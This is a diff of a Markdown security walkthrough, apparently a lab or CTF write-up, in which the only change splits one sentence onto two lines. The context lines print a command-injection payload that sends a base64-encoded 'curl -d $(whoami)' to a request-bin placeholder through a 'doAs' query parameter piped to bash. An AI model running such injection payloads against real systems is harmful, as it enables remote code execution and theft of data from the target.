@@ -312,7 +312,8 @@ base64.b64encode(b'curl -d $(whoami) <REQUEST-BIN-URL>')
 curl -X "GET" http://<IP>:8080/?doAs=`echo <base_64_string> | base64 -d | bash`
 ```
 
-We can see that we have got two GET requests in our Request Bin logger. One of this contains the target username:
+We can see that we have got two GET requests in our Request Bin logger.
+One of this contains the target username:
 
 <img src="./assets/username.png" width=850 height=400>
 
